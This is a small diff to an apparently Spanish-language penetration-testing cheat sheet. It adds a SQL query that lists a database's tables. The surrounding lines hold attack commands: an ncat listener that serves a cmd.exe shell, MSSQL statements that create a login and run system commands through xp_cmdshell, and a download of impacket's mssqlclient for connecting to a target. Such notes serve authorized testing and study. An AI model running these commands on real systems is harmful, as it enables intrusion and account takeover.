@@ -98,6 +98,8 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 		EXEC sp_addlogin 'user', 'pass';
 		EXEC xp_cmdshell 'net user'; -- privOn
 	
+	SELECT NAME FROM sys.objects WHERE TYPE='U' // Sacar todas las tablas de una base de datos, más rápido que con sqlmap a pelo, requiere de sql-shell
+	
 	wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
 	python mssqlclient.py -port 1433 -db BBDD USER:'PASS'@IP [-windows-auth]
 		
